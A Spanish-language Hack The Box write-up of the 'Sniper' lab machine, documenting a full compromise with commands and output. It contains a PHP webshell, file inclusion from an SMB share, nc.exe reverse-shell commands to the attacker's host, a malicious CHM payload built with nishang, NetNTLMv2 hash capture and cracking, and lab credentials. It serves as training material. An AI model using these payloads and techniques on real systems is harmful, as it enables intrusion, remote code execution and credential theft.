---
layout: single
title: Sniper - Hack The Box 
excerpt: "Sniper es una máquina Windows de dificultad media que cuenta con un servidor PHP. El servidor aloja un archivo que se encuentra vulnerable a la inclusión local y remota de archivos. La ejecución de comandos se obtiene en el servidor en el contexto de `NT AUTHORITY\\iUSR` a través de la inclusión local de archivos PHP Session maliciosamente diseñados. Las credenciales expuestas de la base de datos se utilizan para obtener acceso como el usuario 'Chris', que tiene la misma contraseña. La enumeración revela que el administrador está revisando archivos CHM (Ayuda HTML compilada), que pueden utilizarse para filtrar el hash NetNTLM-v2 del administrador. Este puede ser capturado, descifrado y utilizado para obtener un shell inverso como administrador utilizando un objeto de credenciales PowerShell."
date: 2023-09-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-sniper/sniper_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - web
  - vulnerability assesment
tags:
  - remote code execution
  - clear text credentials
  - misconfiguration
  - remote file inclusion
  - local file inclusion
---
![](/assets/images/htb-writeup-sniper/sniper_logo.png)


Sniper es una máquina Windows de dificultad media que cuenta con un servidor PHP. El servidor aloja un archivo que se encuentra vulnerable a la inclusión local y remota de archivos. La ejecución de comandos se obtiene en el servidor en el contexto de 'NT AUTHORITY\iUSR' a través de la inclusión local de archivos PHP Session maliciosamente diseñados. Las credenciales expuestas de la base de datos se utilizan para obtener acceso como el usuario 'Chris', que tiene la misma contraseña. La enumeración revela que el administrador está revisando archivos CHM (Ayuda HTML compilada), que pueden utilizarse para filtrar el hash NetNTLM-v2 del administrador. Este puede ser capturado, descifrado y utilizado para obtener un shell inverso como administrador utilizando un objeto de credenciales PowerShell.

## <span style="color: yellow;">Recon</span>

```
┌─[ot3ro@parrot]─[~/HTB/Sniper/Nmap]
└──╼ $sudo nmap -sT 10.10.10.151 -p- --open --disable-arp-ping -n -vv --reason -oN nmap-sT-Sniper


Scanning 10.10.10.151 [65535 ports]
Discovered open port 80/tcp on 10.10.10.151
Discovered open port 139/tcp on 10.10.10.151
Discovered open port 445/tcp on 10.10.10.151
Discovered open port 135/tcp on 10.10.10.151
Completed Connect Scan at 16:28, 421.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.151
Host is up, received echo-reply ttl 127 (0.16s latency).
Scanned at 2023-09-10 16:21:48 CST for 421s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
49667/tcp open  unknown      syn-ack

```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper/Nmap]
└──╼ $sudo nmap -sV 10.10.10.151 -p80,135,139,445,49667 -Pn -n -v -oN nmap-sV-sniper


Discovered open port 445/tcp on 10.10.10.151
Discovered open port 139/tcp on 10.10.10.151
Discovered open port 135/tcp on 10.10.10.151
Discovered open port 80/tcp on 10.10.10.151
Discovered open port 49667/tcp on 10.10.10.151
Nmap scan report for 10.10.10.151
Host is up (0.16s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Encontramos que el puerto 80 está abierto y está siendo utilizado para un servidor web. Este servidor web en particular es Microsoft IIS, que es comúnmente utilizado para alojar sitios web y aplicaciones web en servidores Windows, El puerto 135 está abierto y generalmente se asocia con el Protocolo de Llamada a Procedimiento Remoto de Microsoft (MSRPC), es esencial para la comunicación entre aplicaciones en sistemas Windows,Puertos 139/tcp y 445/tcp (NetBIOS y Microsoft-DS): Estos puertos se utilizan para funciones de comunicación de red en sistemas Windows. El puerto 139 está relacionado con NetBIOS, mientras que el puerto 445 se utiliza para el servicio Microsoft-DS, que se encarga del uso compartido de archivos y la administración de recursos en sistemas Windows.
```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $whatweb -v http://10.10.10.151/

Status    : 200 OK
Title     : Sniper Co.
IP        : 10.10.10.151
Country   : RESERVED, ZZ

Summary   : Bootstrap[3.0.0], HTML5, HTTPServer[Microsoft-IIS/10.0], JQuery[2.1.3], Microsoft-IIS[10.0], PHP[7.3.1], Script, X-Powered-By[PHP/7.3.1]

HTTP Headers:
	HTTP/1.1 200 OK
	Content-Type: text/html; charset=UTF-8
	Server: Microsoft-IIS/10.0
	X-Powered-By: PHP/7.3.1
	Date: Mon, 11 Sep 2023 07:01:25 GMT
	Connection: close
	Content-Length: 2635

```
## <span style="color: yellow;">Site</span>

![](/assets/images/htb-writeup-sniper/website.png)

Notamos que en la URL se está pasando un parámetro llamado "lang" con el valor "blog-en.php" a la página /blog/ cuando se intenta cambiar el lengüaje de la página.
A continuación vamos a hacer una captura de la petición HTTP GET con Burpsuite para analizar el comportamiento del sitio.

## <span style="color: yellow;">Blog</span>

![](/assets/images/htb-writeup-sniper/param_lang.png)

Nos damos cuenta que el párametro "lang" en vulnerable al Local File Inclusion (LFI), en el sig. ejemplo hacemos una consulta del archivo 'hosts' de Windows.

## <span style="color: yellow;">Local File Inclusion</span>

![](/assets/images/htb-writeup-sniper/LFI.png)

una buena idea es intentar una 'Exfiltración de archivos a través de LFI con SMB'. Primero configuramos un servidor SMB, en mi caso con 'Impacket' y compartiremos un recurso de prueba para intentar cargarlo desde la maquina objetivo:

```
┌─[ot3ro@parrot]─[~]
└──╼ $echo 'esto es un test de LFI' > test.txt
```
![](/assets/images/htb-writeup-sniper/test.png)

<div style="text-align: center; margin-bottom: 20px;">
  <img src="/assets/images/htb-writeup-sniper/impacket_response.png" />
  </div>
Ahora intentaremos ejecutar código de manera remota desde de la máquina víctima a nuestro host. Primero haremos un código PHP, en este caso una función de "llamada al sistema" para cargarlo en la máquina víctima.
Vamos a crear un archivo llamado 'test_RCE.php'.

```php
<?php system('echo "Esto es un test de RCE"');?>
```
Montamos un servidor 'smb' con impacket-smbserver para servir el archivo 'test_RCE.php'.

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo impacket-smbserver share -smb2support $(pwd)

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```
## <span style="color: yellow;">Remote Code Execution</span>

Ahora descargamos el archivo 'test_RCE.php' desde Burpsuite:

![](/assets/images/htb-writeup-sniper/test_RCE.png)

Ya comprobamos que podemos ejecutar código php en el servidor, ahora vamos a crear una webshell en un archivo php con un parámetro 'cmd' para pasarle nuestros códigos como entrada.

```php
<?php system($_REQUEST["cmd"]);?>

```
![](/assets/images/htb-writeup-sniper/whoami.png)


![](/assets/images/htb-writeup-sniper/systeminfo.png)

## <span style="color: yellow;">Revershell</span>

Lo lógico ahora sería intentar mandarnos una revershell. Primero nos ponemos en escucha con nc, en mi caso por el puerto 4444, luego en nuestro servidor SMB compartimos como recurso el ejecutable de 'nc.exe', para cargarlo desde la máquina objetivo y asignarle los parámetros para que nos devuelva una shell al momento de descargarse.

```
┌─[ot3ro@parrot]─[~/HTB/Sniper/shell]
└──╼ $locate nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe

┌─[ot3ro@parrot]─[~/HTB/Sniper/shell]
└──╼ $cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper/shell]
└──╼ $sudo impacket-smbserver share -smb2support $(pwd) 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo nc -lnvp 4444
listening on [any] 4444 ...
```


![](/assets/images/htb-writeup-sniper/burp_nc_rever.png)

Y hemos obtenido una shell.

![](/assets/images/htb-writeup-sniper/nc_rever_conection.png)

## <span style="color: yellow;">Post-explotación</span>
```
PS C:\inetpub\wwwroot\blog> whoami
whoami
nt authority\iusr


PS C:\inetpub\wwwroot\blog> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

A continuación vamos a revisar el webroot del servidor IIS para ir listando los directorios y archivos que nos llamen la atención, e ir recolectando información relevante:

```
PS C:\inetpub\wwwroot\blog> cd ..
PS C:\inetpub\wwwroot> gci




Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/11/2019   5:23 AM                blog                                                                  
d-----        4/11/2019   5:23 AM                css                                                                   
d-----        4/11/2019   5:23 AM                images                                                                
d-----        4/11/2019   5:23 AM                js                                                                    
d-----        4/11/2019   5:23 AM                scss                                                                  
d-----        10/1/2019   8:44 AM                user                                                                  
-a----        4/11/2019   5:22 PM           2635 index.php                                                             


PS C:\inetpub\wwwroot> cd user	
PS C:\inetpub\wwwroot\user> gci




Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        4/11/2019   5:52 AM                css                                                                   
d-----        4/11/2019   5:23 AM                fonts                                                                 
d-----        4/11/2019   5:23 AM                images                                                                
d-----        4/11/2019   5:23 AM                js                                                                    
d-----        4/11/2019   5:23 AM                vendor                                                                
-a----        4/11/2019   5:15 PM            108 auth.php                                                              
-a----        4/11/2019  10:51 AM            337 db.php                                                                
-a----        4/11/2019   6:18 AM           4639 index.php                                                             
-a----        4/11/2019   6:10 AM           6463 login.php                                                             
-a----         4/8/2019  11:04 PM            148 logout.php                                                            
-a----        10/1/2019   8:42 AM           7192 registration.php                                                      
-a----        8/14/2019  10:35 PM           7004 registration_old123123123847.php 


PS C:\inetpub\wwwroot\user> gc db.php  	
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

El script "db.php" crea una conexión con un servidor MySQL en el localhost utilizando las siguientes credenciales:

- <p style="font-size: 16px;">Nombre de usuario: "dbuser"</p>
- <p style="font-size: 16px;">Contraseña: "36mEAhz/B8xQ~2VM"</p>
- <p style="font-size: 16px;">Base de datos: "sniper"</p>

Esta conexión se utiliza para interactuar con la base de datos MySQL desde la aplicación web.

Ahora sería bueno intentar descubrir a qué usuario le pertenece el password "36mEAhz/B8xQ~2VM" que encontramos en el archivo db.php; vamos a listar los usuarios presentes en el sistema y luego usar la herramienta 'crackmapexec' para probar las credenciales:

```
PS C:\inetpub\wwwroot> Get-WmiObject -Class win32_UserAccount | Select-Object Name


Name              
----              
Administrator     
Chris             
DefaultAccount    
Guest             
WDAGUtilityAccount
```

```
┌─[ot3ro@parrot]─[~]
└──╼ $crackmapexec smb 10.10.10.151 -u "Chris" -p "36mEAhz/B8xQ~2VM"

SMB         10.10.10.151    445    SNIPER           [*] Windows 10.0 Build 17763 x64 (name:SNIPER) (domain:Sniper) (signing:False) (SMBv1:False)
SMB         10.10.10.151    445    SNIPER           [+] Sniper\Chris:36mEAhz/B8xQ~2VM 
```
Hemos descubierto que la contraseña "36mEAhz/B8xQ~2VM" le pertenece al usuario Chris.

## <span style="color: yellow;">Movimiento-Lateral</span>

A continuación vamos a intentar ejecutar comandos en el sistema *local* como el usuario Chris, para esto vamos a usar el cmdlet 'Invoke-Command' esta herramienta nos ayuda a ejecutar comandos en una máquina remota o en la máquina local de PowerShell,
para usarla tenemos que especificar las credenciales del usuario , en este caso vamos a crear un objeto con las credenciales del usuario Chris. La sintaxis básica de 'Invoke-Command' que usaremos va a ser la sig: 
```powershell
"Invoke-Command -ComputerName <nombre_máquina> -Credential <dominio\usuario> -ScriptBlock {<comando a ejecutar>}".
```

```
PS C:\inetpub\wwwroot> $cred = New-Object System.Management.Automation.PSCredential("Sniper\Chris",(ConvertTo-SecureString -String "36mEAhz/B8xQ~2VM" -AsPlainText -Force))

PS C:\inetpub\wwwroot> Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $cred -ScriptBlock {whoami}
sniper\chris

```
Nos ponemos en escucha con 'nc' en nuestra máquina de atacante , en mi caso en el puerto 9001:

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo rlwrap nc -lnvp 9001
listening on [any] 9001 ...

```
Y ejecutamos comando como el usuario Chris para mandarnos una revershell usando el ejecutable 'nc.exe' que descargaremos de nuestro servidor 'impacket-smbserver' anterior:

```
PS C:\inetpub\wwwroot> Invoke-Command -ComputerName $env:COMPUTERNAME -Credential $cred -ScriptBlock {\\10.10.14.15\share\nc.exe 10.10.14.15 9001 -e powershell}
```
><p style="font-size: 16px;">NOTA: Si notas que falla la conexión, intenta reiniciar tu servidor SMB.</p>

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo rlwrap nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.151] 49765
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Chris\Documents> whoami
sniper\chris

PS C:\Users\Chris\Documents> 

```
Hemos logrado conectarnos a la máquina Sniper como el usuario Chris.

```
PS C:\Users\Chris> cd Desktop
PS C:\Users\Chris\Desktop> Get-ChildItem -Force

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a-hs-        4/11/2019   7:04 AM            282 desktop.ini                                                           
-ar---        9/13/2023  12:07 AM             34 user.txt 

PS C:\Users\Chris\Desktop> gc user.txt
1f7474c8472b4fa266a6be9938f0ca6c
```
Y vemos que ya logramos obtener nuestra primer flag user.txt. Ahora nos toca intentar escalar privilegios. Entonces seguiremos enumerando la máquina.


```
PS C:\Users\Chris\downloads> Get-ChildItem -Force


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a-hs-        4/11/2019   7:04 AM            282 desktop.ini                                                           
-a----        4/11/2019   8:36 AM          10462 instructions.chm                                                      
```
Encontramos un archivo 'chm' ("Compiled HTML Help"); CHM Es un archivo en formato binario de ayuda de Microsoft HTML.  Los archivos CHM suelen contener una tabla de contenido, índices, enlaces y búsqueda para facilitar la navegación y búsqueda de información.

Vamos a intentar transferir el archivo 'instructions.chm' a nuestra máquina de atacante. Primero vamos a calcular el hash del archivo para después compararlo una vez descargado en nuestra máquina con 'md5sum' y verificar que sea el mismo y no hay sufrido alguna modificación; En mi caso para transferir el archivo a mi máquina, usaré un script llamado 'PSUpload.ps1' que descargué del sitio de Github de Julio Ureña "https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1", lo copiaré desde mi server SMB a la máquina víctima y montaré un servidor 'uploadserver' con python3 para recibir el archivo.

```
PS C:\Users\Chris\downloads> Get-FileHash "./instructions.chm" -Algorithm MD5 | select Hash

Hash                            
----                            
CD689B38697B2FCAB562D41D6519373E


PS C:\Users\Chris\downloads> copy \\10.10.14.15\share\PSUpload.ps1
PS C:\Users\Chris\downloads> Invoke-FileUpload -Uri http://10.10.14.15/upload -File ./instructions.chm

```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo python3 -m uploadserver 80

File upload available at /upload
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.151 - - [13/Sep/2023 19:31:00] [Uploaded] "instructions.chm" --> /home/ot3ro/HTB/Sniper/instructions.chm
10.10.10.151 - - [13/Sep/2023 19:31:00] "POST /upload HTTP/1.1" 204 -


┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo chown ot3ro instructions.chm 

┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $md5sum instructions.chm 
cd689b38697b2fcab562d41d6519373e  instructions.chm

```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $xchm instructions.chm 
```
![](/assets/images/htb-writeup-sniper/xchm2.png)

En sí no vemos nada relevante en el contenido del archivo, pero investigando más a fondo podemos descubrir que existe un vector de ataque relacionado con los binarios 'chm'.

><p style="font-size: 16px;">Los delincuentes pueden abusar de los archivos HTML compilados (.chm) para ocultar código malicioso. Los archivos CHM se distribuyen habitualmente como parte del sistema de ayuda HTML de Microsoft. Los archivos CHM son compilaciones comprimidas de diversos contenidos, como documentos HTML, imágenes y lenguajes de programación relacionados con scripts/web, como VBA, JScript, Java y ActiveX. El contenido CHM se muestra utilizando componentes subyacentes del navegador Internet Explorer cargados por el programa ejecutable de Ayuda HTML (hh.exe). Un archivo CHM personalizado que contenga cargas útiles incrustadas podría ser entregado a una víctima y luego ser activado por la Ejecución de Usuario. La ejecución de CHM también puede eludir el control de aplicaciones en sistemas antiguos y/o sin parches que no tengan en cuenta la ejecución de binarios a través de hh.exe.</p>

Para aprovechar que podemos ejecutar archivos binarios chm en el sistema, ahora vamos a usar también una **máquina virtual Windows** de atacante y vamos a trabajar con el framework de 'nishang', especificamente trabajaremos con el script 'Out-CHM.ps1' que sirve para crear archivos chm maliciosos para la explotación del lado del cliente. También es importante descargar el programa 'htmlhelp.exe'(es un programa ejecutable de Windows que se utiliza para abrir y visualizar archivos de ayuda en formato CHM) que nos creará un directorio llamado "HTML Help Workshop". 

## <span style="color: yellow;">Escalada de privilegios</span>
#### <span style="color: gray;">Máquina virtual Windows</span>
```
PS C:\HTB\Sniper> Get-ExecutionPolicy
Restricted
PS C:\HTB\Sniper> Set-ExecutionPolicy Unrestricted

Cambio de directiva de ejecución
La directiva de ejecución te ayuda a protegerte de scripts en los que no confías. Si cambias dicha directiva, podrías
exponerte a los riesgos de seguridad descritos en el tema de la Ayuda about_Execution_Policies en
https:/go.microsoft.com/fwlink/?LinkID=135170. ¿Quieres cambiar la directiva de ejecución?
[S] Sí  [O] Sí a todo  [N] No  [T] No a todo  [U] Suspender  [?] Ayuda (el valor predeterminado es "N"): O

PS C:\HTB\Sniper> Import-Module .\Out-CHM.ps1 

PS C:\HTB\Sniper> out-chm -payload "ping 10.10.14.15" -HHCPath "C:\Program Files (x86)\HTML Help Workshop\"

Compiling c:\HTB\Sniper\doc.chm


Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics


Created c:\HTB\Sniper\doc.chm, 13,424 bytes
Compression increased file by 153 bytes.

PS C:\HTB\Sniper> gci


    Directorio: C:\HTB\Sniper


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----     14/09/2023  06:23 p. m.          13444 doc.chm
-a----     14/09/2023  06:19 p. m.          19815 Out-CHM.ps1

```
Luego nos transferimos el archivo doc.chm de nuestra máquina Windows a nuestra máquina linux usando nuestro servidor SMB.
><p style="font-size: 16px;">NOTA: Cada vez que vayas a transeferir un archivo desde la máquina Windows al servidor SMB de tu máquina Linux, es probable que tengas que ir creando una sesión SMB con autenticación, ej. "<p style="color: gray;">impacket-smbserver share -smb2support $(pwd) -user guest -password guest</p> y desde la máquina Windows mapear una unidad de red local, ej. <p style="color: gray;">net use n: \\10.10.14.15\share /user:guest guest</p>ya después de crear la unidad de red, ahora sí puedes transferir el archivo de la sig. manera:<p style="color: gray;">copy c:\'archivo' n:"

Una vez que tengamos nuestro archivo malicioso chm en nuestra máquina de atacante, ahora debemos descargar el archivo desde la máquina Windows víctima como el usuario 'Chris':
```
PS C:\docs> Copy-Item -Path "\\10.10.14.15\share\doc.chm" -Destination .
```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper/shell]
└──╼ $sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:07:42.736495 IP 10.10.10.151 > 10.10.14.15: ICMP echo request, id 1, seq 21, length 40
21:07:42.736528 IP 10.10.14.15 > 10.10.10.151: ICMP echo reply, id 1, seq 21, length 40
21:07:43.760309 IP 10.10.10.151 > 10.10.14.15: ICMP echo request, id 1, seq 22, length 40
21:07:43.760341 IP 10.10.14.15 > 10.10.10.151: ICMP echo reply, id 1, seq 22, length 40
21:07:44.784424 IP 10.10.10.151 > 10.10.14.15: ICMP echo request, id 1, seq 23, length 40
21:07:44.784532 IP 10.10.14.15 > 10.10.10.151: ICMP echo reply, id 1, seq 23, length 40
21:07:45.767292 IP 10.10.10.151 > 10.10.14.15: ICMP echo request, id 1, seq 24, length 40
21:07:45.767327 IP 10.10.14.15 > 10.10.10.151: ICMP echo reply, id 1, seq 24, length 40

```
><p style="font-size: 16px;">Es importante que busques un directorio en el sistema que te permita ejecutar el archivo chm, en mi caso lo hice desde el directorio "Docs"</p>

Y vemos que tcpdump capturó el tráfico ICMP generado por la máquina víctima 10.10.10.151. Hemos comprobado la ejecución remota de código a través de un archivo binario chm. Ahora vamos a intentar ejecutar una revershell a nuestra máquina Linux siguiendo el mismo principio anterior:

#### <span style="color: gray;">Máquina virtual Windows</span>
```
PS C:\HTB\Sniper> Out-CHM -Payload "\\10.10.14.15\share\nc.exe 10.10.14.15 443 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop\"
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\HTB\Sniper\doc.chm


Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics


Created c:\HTB\Sniper\doc.chm, 13,444 bytes
Compression increased file by 133 bytes.
```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
```

```
PS C:\docs> Copy-Item -Path "\\10.10.14.15\share\doc.chm" -Destination .
```
```
┌─[ot3ro@parrot]─[~/HTB/Sniper/shell]
└──╼ $sudo impacket-smbserver share -smb2support $(pwd) 
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.151,49837)
[*] AUTHENTICATE_MESSAGE (\,SNIPER)
[*] User SNIPER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:SHARE)
[*] AUTHENTICATE_MESSAGE (SNIPER\Administrator,SNIPER)
[*] User SNIPER\Administrator authenticated successfully
[*] Administrator::SNIPER:aaaaaaaaaaaaaaaa:1acb8754d3f3cdd2ad7af21eb46915f6:010100000000000080c9de8485e7d901188ae75fcc0295ce000000000100100051004f007400550075004800770051000300100051004f00740055007500480077005100020010007900670044005700740056006c006e00040010007900670044005700740056006c006e000700080080c9de8485e7d901060004000200000008003000300000000000000000000000003000007480d1ed9d12e146d86930de328cc3d8fcf8ccba147fa4ecd4ab81edf9fdbad80a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000

...[SNIP]...
```
En este primer intento, el comando de revershell que usamos en el archivo doc.chm no funciona como esperábamos,  pero vemos que el smbserver captura el hash NetNTLM-v2 del usuario Administrador, entonces lo que primero podríamos hacer es intentar crackear el hash con 'hashcat' y luego  modificar el código en el archivo doc.chm para lograr conectarnos al sistema con la revershell.
## <span style="color: yellow;">Escalada de privilegios</span>

#### <span style="color: gray;">Crackeo del hash NTLM-v2 del administrador</span>
```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $hashcat -m 5600 administrator-ntlmv2 /usr/share/wordlists/rockyou.txt  --force
hashcat (v6.1.1) starting...

...[SNIP]...

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 6 secs

ADMINISTRATOR::SNIPER:aaaaaaaaaaaaaaaa:37318c8f3a97979029b71ffeb6342f23:0101000000000000008da88685e7d90183e27c4dfa4d6fae000000000100100051004f007400550075004800770051000300100051004f00740055007500480077005100020010007900670044005700740056006c006e00040010007900670044005700740056006c006e0007000800008da88685e7d901060004000200000008003000300000000000000000000000003000007480d1ed9d12e146d86930de328cc3d8fcf8ccba147fa4ecd4ab81edf9fdbad80a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003500000000000000000000000000
:butterfly!#1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: ADMINISTRATOR::SNIPER:aaaaaaaaaaaaaaaa:37318c8f3a97...000000
Time.Started.....: Thu Sep 14 21:53:41 2023, (10 secs)
Time.Estimated...: Thu Sep 14 21:53:51 2023, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   194.1 kH/s (6.00ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1953792/14344385 (13.62%)
Rejected.........: 0/1953792 (0.00%)
Restore.Point....: 1950720/14344385 (13.60%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: c411426 -> burlfloor12

```
Y hashcat nos muestra la contraseña descifrada : "butterfly!#1". Vamos a intentar conectarnos a la máquina víctima como el usuario 'Administrator':

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $impacket-psexec SNIPER/Administrator:'butterfly!#1'@10.10.10.151

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.151.....
[*] Found writable share ADMIN$
[*] Uploading file fmBhbOfo.exe
[*] Opening SVCManager on 10.10.10.151.....
[*] Creating service sJwY on 10.10.10.151.....
[*] Starting service sJwY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>dir C:\Users\Administrator\Desktop /s
 Volume in drive C has no label.
 Volume Serial Number is AE98-73A8

 Directory of C:\Users\Administrator\Desktop

03/22/2023  10:22 AM    <DIR>          .
03/22/2023  10:22 AM    <DIR>          ..
09/15/2023  12:27 AM                34 root.txt
               1 File(s)             34 bytes

     Total Files Listed:
               1 File(s)             34 bytes
               2 Dir(s)   2,403,225,600 bytes free

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
d7f1325940032e33ac759b19d18693d7

C:\Windows\system32>

```
Hemos logrado conectarnos al sistema con privilegios elevados de "nt authority \system", también capturamos la flag root.txt

### <span style="color: orange;">Captura alternativa de la flag</span>

Falta intentar ahora la conexión con la revershell que nos quedó pendiente. Para éso esta vez vamos a intentar transferir el ejecutable nc.exe a la máquina víctima del usuario Chris, y despues crearemos nuestro nuevo archivo doc.chm con el payload modificado en nuestra máquina virtual Windows; la idea es que el binario chm llame directamente a nc.exe desde el sistema local.

#### <span style="color: gray;">Máquina virtual Windows</span>
```
PS C:\HTB\Sniper> Out-CHM -Payload "C:\users\Chris\downloads\nc.exe 10.10.14.15 443 -e powershell" -HHCPath "C:\Program Files (x86)\HTML Help Workshop\"
Microsoft HTML Help Compiler 4.74.8702

Compiling c:\HTB\Sniper\doc.chm


Compile time: 0 minutes, 0 seconds
2       Topics
4       Local links
4       Internet links
0       Graphics


```

```
PS C:\users\chris\downloads> Copy-Item -Path "\\10.10.14.15\share\nc.exe" -Destination .
```
```
PS C:\Docs> Copy-Item -Path "\\10.10.14.15\share\doc.chm" -Destination .
```

```
┌─[ot3ro@parrot]─[~/HTB/Sniper]
└──╼ $sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.151] 49861
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

whoami
whoami
sniper\administrator
PS C:\Windows\system32> 
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt


d7f1325940032e33ac759b19d18693d7
```
Y capturamos otra vez la flag root.txt

